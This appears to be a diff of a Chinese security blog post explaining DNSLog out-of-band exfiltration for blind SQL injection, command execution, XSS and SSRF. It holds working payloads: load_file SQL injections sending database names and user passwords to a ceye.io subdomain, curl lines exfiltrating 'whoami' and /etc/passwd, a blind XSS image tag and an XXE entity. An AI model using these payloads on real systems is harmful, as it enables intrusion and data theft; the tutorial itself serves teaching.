@@ -4,17 +4,17 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, minimum-scale=1, initial-scale=1, maximum-scale=5, viewport-fit=cover">
     <title>通过DNSLog获取无回显信息 | Edsion's Blog</title>
-    <meta name="description" content="0x01 原理  NS（Name Server）记录是域名服务器记录，用来指定该域名由哪个DNS服务器来进行解析 DNS：域名解析服务器 A记录：指定域名对应的IP地址  一句话归纳😪😪：将需要查询的值和域名拼接起来，向域名发送请求，DNS在解析的时候会留下日志，读取日志便可以获取信息。  案例解释  12ping &#96;whoami&#96;.test.com	&#x2F;&#x2F;发">
+    <meta name="description" content="0x01 原理  NS（Name Server）记录是域名服务器记录，用来指定该域名由哪个DNS服务器来进行解析 DNS：域名解析服务器 A记录：指定域名对应的IP地址  一句话归纳😪😪： 　　将需要查询的值和域名拼接起来，向域名发送请求，DNS在解析的时候会留下日志，读取日志便可以获取信息。  案例解释  12ping &#96;whoami&#96;.test.com	&#x2F;&amp;#x2">
 <meta property="og:type" content="article">
 <meta property="og:title" content="通过DNSLog获取无回显信息">
 <meta property="og:url" content="http://yoursite.com/2020/07/04/DNSLog/index.html">
 <meta property="og:site_name" content="Edsion&#39;s Blog">
-<meta property="og:description" content="0x01 原理  NS（Name Server）记录是域名服务器记录，用来指定该域名由哪个DNS服务器来进行解析 DNS：域名解析服务器 A记录：指定域名对应的IP地址  一句话归纳😪😪：将需要查询的值和域名拼接起来，向域名发送请求，DNS在解析的时候会留下日志，读取日志便可以获取信息。  案例解释  12ping &#96;whoami&#96;.test.com	&#x2F;&#x2F;发">
+<meta property="og:description" content="0x01 原理  NS（Name Server）记录是域名服务器记录，用来指定该域名由哪个DNS服务器来进行解析 DNS：域名解析服务器 A记录：指定域名对应的IP地址  一句话归纳😪😪： 　　将需要查询的值和域名拼接起来，向域名发送请求，DNS在解析的时候会留下日志，读取日志便可以获取信息。  案例解释  12ping &#96;whoami&#96;.test.com	&#x2F;&amp;#x2">
 <meta property="og:image" content="https://raw.githubusercontent.com/Dsysf/images/master/img/20200704105715.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/Dsysf/images/master/img/20200704105732.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/Dsysf/images/master/img/20200704105806.png">
 <meta property="article:published_time" content="2020-07-04T13:32:36.000Z">
-<meta property="article:modified_time" content="2020-07-04T14:05:31.920Z">
+<meta property="article:modified_time" content="2020-07-04T14:15:22.583Z">
 <meta property="article:author" content="Edsion Shen">
 <meta property="article:tag" content="技巧">
 <meta name="twitter:card" content="summary">
@@ -215,22 +215,21 @@
 DNS：域名解析服务器<br>
 A记录：指定域名对应的IP地址</p>
 </blockquote>
-<p><strong>一句话归纳</strong>😪😪：<font color=blue>将需要查询的值和域名拼接起来，向域名发送请求，DNS在解析的时候会留下日志，读取日志便可以获取信息。</font></p>
+<p><strong>一句话归纳</strong>😪😪：<br>
+　　<font color=blue>将需要查询的值和域名拼接起来，向域名发送请求，DNS在解析的时候会留下日志，读取日志便可以获取信息。</font></p>
 <ul>
 <li>案例解释</li>
 </ul>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ping &#96;whoami&#96;.test.com	&#x2F;&#x2F;发出请求</span><br><span class="line">ping root.test.com	&#x2F;&#x2F;实际请求</span><br></pre></td></tr></table></figure>
 <p><code>whoami</code>在命令行中就自动解析了，所以其实是向<code>root.test.com</code>发出的请求，这时就会被DNS服务器所捕获，我们就能从日志中获取命令执行后的结果了。那到底怎么利用DNSLog进行注入呢？其实只要是能够发出请求的地方都可以用这种方式获取数据。</p>
 <h2 id="0x02-DNSLog平台">0x02 DNSLog平台</h2>
-<p>一、在线平台：</p>
-<p><a href="http://ceye.io" target="_blank" rel="noopener">http://ceye.io</a><br>
-　　<a href="http://www.dnslog.cn" target="_blank" rel="noopener">http://www.dnslog.cn</a></p>
-<p>二、自己搭建DNSLog服务器：<a href="https://github.com/BugScanTeam/DNSLog" target="_blank" rel="noopener">https://github.com/BugScanTeam/DNSLog</a></p>
+<p>一、在线平台：<code>http://ceye.io</code>、<code>http://www.dnslog.cn</code></p>
+<p>二、自己搭建DNSLog服务器：<code>https://github.com/BugScanTeam/DNSLog</code></p>
 <p>三、 BurpSuite collaborator</p>
 <p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200704105715.png" alt=""><br>
 <img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200704105732.png" alt=""></p>
 <p>点击Copy to Clipboard获取一个标识<br>
-<a href="http://xn--s6z9p5lykbxh0m8wx3vy44qg278xwm-ch34c29z9s9bpct650ch84aow7bw46edu5eyoretyqa.burpcollaborator.net" target="_blank" rel="noopener">比如我这里获取到的就是s6z9p5lykbxh0m8wx3vy44qg278xwm.burpcollaborator.net</a><br>
+比如我这里获取到的就是<code>s6z9p5lykbxh0m8wx3vy44qg278xwm.burpcollaborator.net</code><br>
 然后用这个外带就行了</p>
 <p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200704105806.png" alt=""></p>
 <h2 id="0x03-DNSLog常用场景">0x03 DNSLog常用场景</h2>
@@ -240,7 +239,7 @@ A记录：指定域名对应的IP地址</p>
 <li>XSS（无回显）</li>
 <li>SSRF(无回显)</li>
 </ol>
-<h3 id="一、SQL盲注">一、SQL盲注</h3>
+<h3 id="SQL盲注">SQL盲注</h3>
 <p>以MySQL为例，在MySQL中有个一个<font color=blue>load_file</font>函数可以用来读取本地的文件。前提是root权限。<br>
 show variables like ‘%secure%’;查看load_file()可以读取的磁盘。</p>
 <ul>
@@ -259,17 +258,17 @@ show variables like ‘%secure%’;查看load_file()可以读取的磁盘。</p>
 <li>几个例子</li>
 </ul>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">直接读取</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.4do468.ceye.io\\abc&#39;))),1,0)%23</span><br><span class="line">hex转码</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select hex(user())),&#39;.4do468.ceye.io\\abc&#39;))),1,0)%23</span><br><span class="line">取数据</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select hex(concat(username,0x7e,password,0x7e)) from security.users limit 0,1),&#39;.4do468.ceye.io\\abc&#39;))),1,0)%23</span><br></pre></td></tr></table></figure>
-<h3 id="二、命令执行">二、命令执行</h3>
+<h3 id="命令执行">命令执行</h3>
 <h4 id="Windows下">Windows下</h4>
 <p>查看计算机名，其他类似</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping %COMPUTERNAME%.xxx.ceye.io</span><br></pre></td></tr></table></figure>
 <h4 id="Linux下">Linux下</h4>
 <p>查看当前用户和passwd文件，其他类似</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;ip.port.xxx.ceye.io&#x2F;&#96;whoami&#96;</span><br><span class="line">curl http:&#x2F;&#x2F;ip.port.xxoo.ceye.io&#x2F;&#96;cat &#x2F;etc&#x2F;passwd&#96;</span><br></pre></td></tr></table></figure>
-<h3 id="三、XSS">三、XSS</h3>
+<h3 id="XSS">XSS</h3>
 <p>通过盲打，让触发者浏览器访问预设至的链接地址，如果盲打成功，会在平台上收到如下的链接访问记录：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:&gt;&lt;img src&#x3D;http:&#x2F;&#x2F;xss.xxxx.ceye.io&#x2F;aaa&gt;</span><br></pre></td></tr></table></figure>
-<h3 id="四、SSRF">四、SSRF</h3>
+<h3 id="SSRF">SSRF</h3>
 <p>payload:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;ip.port.xxx.ceye.io&#x2F;aa&quot;&gt;</span><br><span class="line">%remote;]&gt;</span><br><span class="line">&lt;root&#x2F;&gt;</span><br></pre></td></tr></table></figure>
 <h2 id="0x04-总结">0x04 总结</h2>
@@ -303,7 +302,7 @@ show variables like ‘%secure%’;查看load_file()可以读取的磁盘。</p>
     <div class="toc-sidebar">
         <nav id="toc" class="article-toc">
             <h3 class="toc-title">Catalogue</h3>
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-原理"><span class="toc-number">1.</span> <span class="toc-text">0x01 原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-DNSLog平台"><span class="toc-number">2.</span> <span class="toc-text">0x02 DNSLog平台</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-DNSLog常用场景"><span class="toc-number">3.</span> <span class="toc-text">0x03 DNSLog常用场景</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#一、SQL盲注"><span class="toc-number">3.1.</span> <span class="toc-text">一、SQL盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#二、命令执行"><span class="toc-number">3.2.</span> <span class="toc-text">二、命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Windows下"><span class="toc-number">3.2.1.</span> <span class="toc-text">Windows下</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Linux下"><span class="toc-number">3.2.2.</span> <span class="toc-text">Linux下</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#三、XSS"><span class="toc-number">3.3.</span> <span class="toc-text">三、XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#四、SSRF"><span class="toc-number">3.4.</span> <span class="toc-text">四、SSRF</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-总结"><span class="toc-number">4.</span> <span class="toc-text">0x04 总结</span></a></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-原理"><span class="toc-number">1.</span> <span class="toc-text">0x01 原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-DNSLog平台"><span class="toc-number">2.</span> <span class="toc-text">0x02 DNSLog平台</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-DNSLog常用场景"><span class="toc-number">3.</span> <span class="toc-text">0x03 DNSLog常用场景</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL盲注"><span class="toc-number">3.1.</span> <span class="toc-text">SQL盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#命令执行"><span class="toc-number">3.2.</span> <span class="toc-text">命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Windows下"><span class="toc-number">3.2.1.</span> <span class="toc-text">Windows下</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Linux下"><span class="toc-number">3.2.2.</span> <span class="toc-text">Linux下</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS"><span class="toc-number">3.3.</span> <span class="toc-text">XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF"><span class="toc-number">3.4.</span> <span class="toc-text">SSRF</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-总结"><span class="toc-number">4.</span> <span class="toc-text">0x04 总结</span></a></li></ol>
         </nav>
     </div>
 </aside>
